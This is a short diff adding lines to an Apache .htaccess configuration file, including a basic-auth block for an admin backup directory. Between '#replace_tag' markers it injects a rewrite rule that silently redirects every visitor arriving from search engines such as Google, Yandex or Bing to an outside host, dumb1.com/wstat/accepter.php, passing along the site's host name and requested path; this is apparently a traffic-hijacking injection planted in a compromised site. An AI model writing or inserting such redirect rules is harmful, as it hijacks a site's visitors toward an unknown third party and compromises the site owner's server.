@@ -1,0 +1,11 @@
+#replace_tag
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} .*(aol|google|rambler|mail|yandex|bing|yahoo).*$ [NC]
+RewriteRule .* http://unem3lx.dumb1.com/wstat/accepter.php?h=%{HTTP_HOST}&u=%{REQUEST_URI}&f=bbd15b275ef0ced787d2e16fe954c7f8&d=a5cef7c1696e707718b8bdb1c0fcfe2e [R,L]
+</IfModule>
+#replace_tag
+AuthType Basic  
+AuthName Admin
+require valid-user 
+AuthUserFile  /home/u178448/bereg-cn.ru/www/backup/.htpasswd
